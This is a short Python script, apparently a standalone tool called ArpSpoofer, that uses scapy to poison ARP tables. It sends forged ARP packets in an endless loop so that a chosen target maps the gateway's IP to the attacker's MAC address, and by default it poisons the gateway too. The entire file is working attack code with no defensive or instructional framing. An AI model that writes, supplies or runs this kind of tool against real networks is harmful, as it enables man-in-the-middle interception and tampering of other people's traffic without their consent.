#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import logging
import os
import signal
import sys
# import netifaces as ni
import time

from scapy.all import *
from scapy.layers.l2 import getmacbyip, Ether, ARP
from getmac import get_mac_address as gma


def parse_args():
    parser = argparse.ArgumentParser(usage="ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw] -t TARGET",
                                     description="Spoof ARP tables")
    parser.add_argument("-i", "--iface", type=str, help="Interface you wish to use",default="eth0")
    parser.add_argument("-s", "--src", type=str, help="The address you want for the attacker")
    parser.add_argument("-d", "--delay", type=int, help="Delay (in seconds) between messages", default=0.5)
    parser.add_argument("-gw", type=int, help="should GW be attacked as well",default=1)
    parser.add_argument("-t", "--target", type=str, help="IP of target")

    args = parser.parse_args()
    return args


def spoof(target_ip, spoof_ip, delay,interface,gw):
    mac_me = gma()
    mac_target = getmacbyip(target_ip)
    pkt =  [ARP(hwsrc=mac_me, psrc=spoof_ip, hwdst=mac_target, pdst=target_ip, op=1)]
    
    if gw:
     pkt += ARP(psrc=target_ip, pdst=spoof_ip, op=2)
     print("gw activated")
    
    while True:
        send(pkt, verbose=0,iface=interface)
        print("target:")
        print(target_ip)
        print("gateway:")
        print(spoof_ip)
        time.sleep(delay)


if __name__ == "__main__":
    arg = parse_args()
    spoof(arg.target, arg.src, arg.delay,arg.iface,arg.gw)



